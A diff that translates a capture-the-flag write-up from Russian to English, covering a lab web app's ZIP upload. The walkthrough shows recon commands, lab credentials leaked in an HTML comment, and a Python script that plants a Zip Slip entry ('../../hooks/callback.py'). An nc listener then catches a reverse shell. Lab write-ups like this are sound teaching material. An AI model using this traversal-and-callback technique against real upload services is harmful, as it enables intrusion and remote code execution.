@@ -1,23 +1,24 @@
-**Теги:** Web.
-**Сложность:** Medium.
+**Tags:** Web.
+
+**Difficulty:** Medium.
 
 # Room 10 — The Hollow Shell
 
-## 1. Разведка
+## 1. Reconnaissance
 
-Цель:
+Target:
 
 ```text
 10.112.128.138
 ```
 
-Первоначально казалось, что веб-страницы нет, поэтому начинаем с Nmap:
+Initially, it seemed that there was no web page, so we start with Nmap:
 
 ```bash
 sudo nmap -sS -sV 10.112.128.138
 ```
 
-Получаем:
+We get:
 
 ```text
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 06:54 EDT
@@ -30,7 +31,7 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Открыты два порта:
+Two ports are open:
 
 ```text
 22/tcp   SSH
@@ -39,15 +40,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ---
 
-## 2. Исследование веб-приложения
+## 2. Web Application Analysis
 
-Проверяем порт `5000`:
+We check port `5000`:
 
 ```bash
 curl -l http://10.112.128.138:5000
 ```
 
-Сервер отвечает редиректом:
+The server responds with a redirect:
 
 ```text
 <!doctype html>
@@ -57,7 +58,7 @@ curl -l http://10.112.128.138:5000
 <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
 ```
 
-Переход ведёт на:
+The redirect leads to:
 
 ```text
 /login
@@ -65,15 +66,15 @@ curl -l http://10.112.128.138:5000
 
 ---
 
-## 3. Поиск учётных данных
+## 3. Finding Credentials
 
-Получаем содержимое страницы:
+We retrieve the page contents:
 
 ```bash
 curl -l http://10.112.128.138:5000/login
 ```
 
-В HTML страницы обнаруживается комментарий:
+An HTML comment is found in the page:
 
 ```html
 <!--
@@ -88,7 +89,7 @@ curl -l http://10.112.128.138:5000/login
 -->
 ```
 
-Таким образом, в исходном коде страницы находятся начальные credentials:
+Thus, the initial credentials are present in the page source:
 
 ```text
 Username: concierge
@@ -97,9 +98,9 @@ Password: StayNoticed2024!
 
 ---
 
-## 4. Авторизация
+## 4. Authentication
 
-Используем найденные credentials:
+We use the discovered credentials:
 
 ```bash
 curl -i -c cookies.txt \
@@ -107,7 +108,7 @@ curl -i -c cookies.txt \
 -d "username=concierge&password=StayNoticed2024!"
 ```
 
-Получаем:
+We get:
 
 ```text
 HTTP/1.1 302 FOUND
@@ -117,13 +118,13 @@ Vary: Cookie
 Set-Cookie: session=eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.anRo0g.ipte9p59bnuT3EN0irV4rn40oEw; HttpOnly; Path=/
 ```
 
-Сервер успешно авторизует пользователя и перенаправляет его на:
+The server successfully authenticates the user and redirects them to:
 
 ```text
 /dashboard
 ```
 
-Переходим на dashboard:
+We access the dashboard:
 
 ```bash
 curl -b cookies.txt -L http://10.112.128.138:5000/dashboard
@@ -131,9 +132,9 @@ curl -b cookies.txt -L http://10.112.128.138:5000/dashboard
 
 ---
 
-# 5. Анализ функциональности загрузки
+# 5. Analyzing the Upload Functionality
 
-На dashboard обнаруживаем функцию загрузки `.zip`:
+On the dashboard, we discover a `.zip` upload function:
 
 ```html
 <h2>Bring a shell ashore</h2>
@@ -145,26 +146,26 @@ curl -b cookies.txt -L http://10.112.128.138:5000/dashboard
 </p>
 ```
 
-Форма:
+The form:
 
 ```html
 <form method="post" action="/upload" enctype="multipart/form-data">
 ```
 
-Загрузка выполняется через:
+The upload is handled through:
 
 ```text
 /upload
 ```
 
-Также страница сообщает, что архив может содержать **automation hooks**:
+The page also mentions that the archive may contain **automation hooks**:
 
 ```text
 A shell may include optional automation hooks — the theme worker
 applies these for you shortly after the shell comes ashore
 ```
 
-Разрешённые типы assets:
+Allowed asset types:
 
 ```text
 png jpg gif svg css json
@@ -172,9 +173,9 @@ png jpg gif svg css json
 
 ---
 
-# 6. Проверка обычного ZIP
+# 6. Testing a Normal ZIP
 
-Создаём простой архив с `shell.json`.
+We create a simple archive containing `shell.json`.
 
 ```bash
 mkdir shell
@@ -187,19 +188,19 @@ cat > shell.json <<'EOF'
 EOF
 ```
 
-Создаём архив:
+Create the archive:
 
 ```bash
 zip -r test.zip shell.json
 ```
 
-Получаем:
+We get:
 
 ```text
 adding: shell.json (deflated 5%)
 ```
 
-Загружаем:
+Upload it:
 
 ```bash
 curl -b ../cookies.txt \
@@ -207,36 +208,36 @@ curl -b ../cookies.txt \
 http://10.112.128.138:5000/upload
 ```
 
-Сервер перенаправляет обратно на dashboard:
+The server redirects back to the dashboard:
 
 ```text
 HTTP/1.1 Redirecting...
 Location: /dashboard
 ```
 
-После повторного просмотра dashboard видим загруженный shell:
+After viewing the dashboard again, we see the uploaded shell:
 
 ```text
 test
 shells/21203082b0f1/
 ```
 
-А после ещё одной загрузки появляется второй:
+After another upload, a second one appears:
 
 ```text
 test
 shells/ff7c47a4ee84/
 ```
 
-Это подтверждает, что сервер принимает ZIP и распаковывает его содержимое.
+This confirms that the server accepts ZIP files and extracts their contents.
 
 ---
 
-# 7. Проверка automation hooks
+# 7. Testing Automation Hooks
 
-Следующим шагом проверяем, можно ли управлять automation hooks через `shell.json`.
+Next, we check whether we can control automation hooks through `shell.json`.
 
-Создаём:
+We create:
 
 ```bash
 mkdir pwn
@@ -257,19 +258,19 @@ cat > shell.json <<'EOF'
 EOF
 ```
 
-Создаём архив:
+Create the archive:
 
 ```bash
 zip -r pwn.zip shell.json
 ```
 
-Получаем:
+We get:
 
 ```text
 adding: shell.json (deflated 39%)
 ```
 
-Загружаем:
+Upload it:
 
 ```bash
 curl -b ~/Desktop/cookies.txt \
@@ -277,26 +278,26 @@ curl -b ~/Desktop/cookies.txt \
 http://10.112.128.138:5000/upload
 ```
 
-После этого на dashboard появляется:
+After this, the dashboard shows:
 
 ```text
 pwn
 shells/6a1aa1d8dc31/
 ```
 
-Однако ожидаемого выполнения `id` через эти поля не происходит.
+However, the expected execution of `id` through these fields does not occur.
 
 ---
 
-# 8. Перечисление директорий
+# 8. Directory Enumeration
 
-Дополнительно запускаем Gobuster:
+We also run Gobuster:
 
 ```bash
 gobuster dir -u http://10.112.128.138:5000 -w ~/HH101/seclists/Discovery/Web-Content/common.txt -x txt,php,py
 ```
 
-Результат:
+Result:
 
 ```text
 ===============================================================
@@ -323,23 +324,23 @@ Progress: 19008 / 19008 (100.00%)
 Finished
 ```
 
-Таким образом, интересных дополнительных endpoints Gobuster не обнаружил.
+Thus, Gobuster does not discover any additional interesting endpoints.
 
 ---
 
-# 9. Обнаружение Zip Slip
+# 9. Discovering Zip Slip
 
-На этом этапе становится понятно, что наиболее интересная часть приложения — обработка загружаемых ZIP-архивов.
+At this point, it becomes clear that the most interesting part of the application is the processing of uploaded ZIP archives.
 
-Создаём ZIP вручную с помощью Python. В архив помещаем обычный `shell.json`, а вторым объектом — файл с traversal-путём:
+We create a ZIP manually using Python. The archive contains a normal `shell.json` and, as a second object, a file with a traversal path:
 
 ```text
 ../../hooks/callback.py
 ```
 
-Это позволяет выйти за пределы директории, в которую приложение распаковывает пользовательский архив.
+This allows us to escape the directory where the application extracts the uploaded archive.
 
-Создаём Python-скрипт:
+We create a Python script:
 
 ```python
 import zipfile, json
@@ -360,61 +361,61 @@ with zipfile.ZipFile("reverse-shell.zip", "w") as z:
     z.writestr("../../hooks/callback.py", callback)
 ```
 
-Ключевой момент здесь:
+The key point here is:
 
 ```python
 z.writestr("../../hooks/callback.py", callback)
 ```
 
-Именно `../` позволяет записать файл за пределами ожидаемого каталога распаковки.
+The `../` allows us to write the file outside the expected extraction directory.
 
-Это классическая уязвимость **Zip Slip / Path Traversal при распаковке архива**.
+This is a classic **Zip Slip / Path Traversal during archive extraction** vulnerability.
 
 ---
 
-# 10. Получение reverse shell
+# 10. Obtaining a Reverse Shell
 
-После запуска Python-скрипта получаем:
+After running the Python script, we get:
 
 ```text
 reverse-shell.zip
 ```
 
-Запускаем Netcat listener:
+Start a Netcat listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Получаем:
+We get:
 
 ```text
 listening on [any] 4444 ...
 connect to [192.168.154.82] from (UNKNOWN) [10.112.128.138] 45448
 ```
 
-Reverse shell успешно подключается.
+The reverse shell successfully connects.
 
-Проверяем текущую директорию:
+We check the current directory:
 
 ```bash
 ls
 ```
 
-Получаем:
+We get:
 
 ```text
 __pycache__  hooks  shells  templates  tmp
 app.py  requirements.txt  static  theme_worker.py  venv
 ```
 
-Текущая директория:
+Current directory:
 
 ```text
 /var/www/conch
 ```
 
-Пользователь:
+User:
 
 ```text
 roomservice
@@ -422,21 +423,21 @@ roomservice
 
 ---
 
-# 11. Получение флага
+# 11. Obtaining the Flag
 
-После получения shell исследуем домашнюю директорию:
+After getting the shell, we inspect the home directory:
 
 ```text
 /home/ubuntu
 ```
 
-В ней обнаруживаем:
+There we find:
 
 ```text
 flag.txt
 ```
 
-Содержимое:
+Contents:
 
 ```text
 THM{z1p_sl1pp3d_1nt0_a_sh3ll}
@@ -444,7 +445,7 @@ THM{z1p_sl1pp3d_1nt0_a_sh3ll}
 
 ---
 
-# Итоговая цепочка
+# Final Chain
 
 ```text
 Nmap
@@ -456,7 +457,7 @@ Nmap
 /login
   │
   ▼
-Credentials в HTML-комментарии
+Credentials in HTML comment
 concierge : StayNoticed2024!
   │
   ▼
@@ -469,14 +470,14 @@ ZIP upload
 shell.json
   │
   ▼
-анализ распаковки ZIP
+ZIP extraction analysis
   │
   ▼
 Zip Slip
 ../../hooks/callback.py
   │
   ▼
-запись Python callback
+write Python callback
   │
   ▼
 reverse shell
@@ -497,12 +498,12 @@ THM{z1p_sl1pp3d_1nt0_a_sh3ll}
 THM{z1p_sl1pp3d_1nt0_a_sh3ll}
 ```
 
-### Основная уязвимость
+### Main Vulnerability
 
-**Zip Slip** — приложение небезопасно обрабатывает пути файлов внутри загружаемого ZIP-архива. Использование:
+**Zip Slip** — the application handles file paths inside uploaded ZIP archives insecurely. Using:
 
 ```text
 ../../hooks/callback.py
 ```
 
-позволяет записать файл вне предназначенной директории. В данном случае это используется для размещения Python callback, который затем выполняется theme worker и устанавливает reverse shell.
+allows us to write a file outside the intended directory. In this case, it is used to place a Python callback, which is then executed by the theme worker and establishes a reverse shell.
